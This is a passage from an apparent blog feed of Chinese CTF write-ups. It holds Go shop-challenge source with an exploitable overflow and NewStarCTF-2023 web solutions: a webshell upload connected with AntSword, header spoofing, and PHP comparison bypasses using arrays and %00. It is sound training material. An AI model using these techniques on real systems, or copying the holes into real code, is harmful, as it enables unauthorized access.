	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	s<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	u <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	users<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Id<span class="token punctuation">:</span> u<span class="token punctuation">,</span> Money<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> Items<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
	s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> u<span class="token punctuation">)</span>
	s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
		<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Reset success"</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">BuyHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

	data <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">)</span>

	<span class="token keyword">var</span> product <span class="token operator">*</span>Product

	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> products <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> v<span class="token punctuation">.</span>Name <span class="token punctuation">&#123;</span>
			product <span class="token operator">=</span> v
			<span class="token keyword">break</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> product <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"No such product"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"num"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Product num can't be negative"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> user<span class="token punctuation">.</span>Money <span class="token operator">>=</span> product<span class="token punctuation">.</span>Price<span class="token operator">*</span><span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		user<span class="token punctuation">.</span>Money <span class="token operator">-=</span> product<span class="token punctuation">.</span>Price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
		user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>product<span class="token punctuation">.</span>Name<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Buy %v * %v success"</span><span class="token punctuation">,</span> product<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You don't have enough money"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">SellHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

	data <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">)</span>

	<span class="token keyword">var</span> product <span class="token operator">*</span>Product

	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> products <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> v<span class="token punctuation">.</span>Name <span class="token punctuation">&#123;</span>
			product <span class="token operator">=</span> v
			<span class="token keyword">break</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> product <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"No such product"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	count <span class="token operator">:=</span> user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
	n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"num"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Product num can't be negative"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> count <span class="token operator">>=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		user<span class="token punctuation">.</span>Money <span class="token operator">+=</span> product<span class="token punctuation">.</span>Price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
		user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>product<span class="token punctuation">.</span>Name<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Sell %v * %v success"</span><span class="token punctuation">,</span> product<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You don't have enough product"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

	v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span><span class="token string">"Flag"</span><span class="token punctuation">]</span>
	<span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token operator">||</span> v <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You must buy &lt;code>flag&lt;/code> first"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
		<span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Here is your flag: &lt;code>%s&lt;/code>"</span><span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	secret <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
	rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>

	tpl<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFS</span><span class="token punctuation">(</span>fs<span class="token punctuation">,</span> <span class="token string">"public/index.html"</span><span class="token punctuation">)</span>
	store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>

	r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">SetHTMLTemplate</span><span class="token punctuation">(</span>tpl<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>

	r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>

	api <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/info"</span><span class="token punctuation">,</span> InfoHandler<span class="token punctuation">)</span>
		api<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/buy"</span><span class="token punctuation">,</span> BuyHandler<span class="token punctuation">)</span>
		api<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/sell"</span><span class="token punctuation">,</span> SellHandler<span class="token punctuation">)</span>
		api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>
		api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/reset"</span><span class="token punctuation">,</span> ResetHandler<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	r<span class="token punctuation">.</span><span class="token function">StaticFileFS</span><span class="token punctuation">(</span><span class="token string">"/static/main.js"</span><span class="token punctuation">,</span> <span class="token string">"public/main.js"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FS</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">StaticFileFS</span><span class="token punctuation">(</span><span class="token string">"/static/simple.css"</span><span class="token punctuation">,</span> <span class="token string">"public/simple.css"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FS</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">)</span>

	r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8000"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>官方wp介绍：</p>
<p><img src="https://img-blog.csdnimg.cn/244ac8e4d87f4ccba56801b545fb6c11.png" alt="132"></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF-2023</title>
    <url>/2023/10/06/NewStarCTF-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="week1-web"><a href="#week1-web" class="headerlink" title="week1-web"></a>week1-web</h2><h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><p><strong>robots.txt+<a href="http://www.zip/">www.zip</a></strong> 得到flag。</p>
<h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p><img src="https://img-blog.csdnimg.cn/0438e24d7ed54a9d8c4375b2347ea9a6.png" alt="1"><br>蚁剑连接之后找到flag。<br><img src="https://img-blog.csdnimg.cn/5a0f93ee0a904b79b076100d8c03dfe9.png" alt="5"></p>
<h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>先GET传入ctf&#x3D;1，在传入secret&#x3D;1，发现需要传入特定值<br><img src="https://img-blog.csdnimg.cn/c50cefbdd8e64ff3b2152524b7413d18.png" alt="1"><br>查看源码找到secret的值<strong>n3wst4rCTF2023g00000d</strong><br><img src="https://img-blog.csdnimg.cn/7f5108c2a098479c9fb5b88b15f62d94.png" alt="5"><br>更改cookie中的power的值，改为<strong>ctfer</strong>。<br>更改UA头为<strong>NewStarCTF2023</strong>。<br>添加Referer为<strong>newstarctf.com</strong>。<br>添加X-Real-Ip为<strong>127.0.0.1</strong>。<br>拿到flag<br><img src="https://img-blog.csdnimg.cn/2c6c547e81d44b5eb3fb30ccff29ed98.png" alt="123"></p>
<h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>让其报错即可拿到flag。<br><img src="https://img-blog.csdnimg.cn/51afcb55d57645e291489cc2d73b1685.png" alt="456"></p>
<h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>简单审计一下代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 1=&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//数组绕过</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 2=&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//数组绕过</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 3=&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$flag3</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//数组绕过</span>
<span class="token comment">//因为strcmp()无法比较数组，则报错并返回0，0==0成立。</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 4=&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2023</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$flag4</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//绕过!is_numeric</span>
<span class="token comment">//后缀%00</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 5=&lt;br>"</span><span class="token punctuation">;</span>
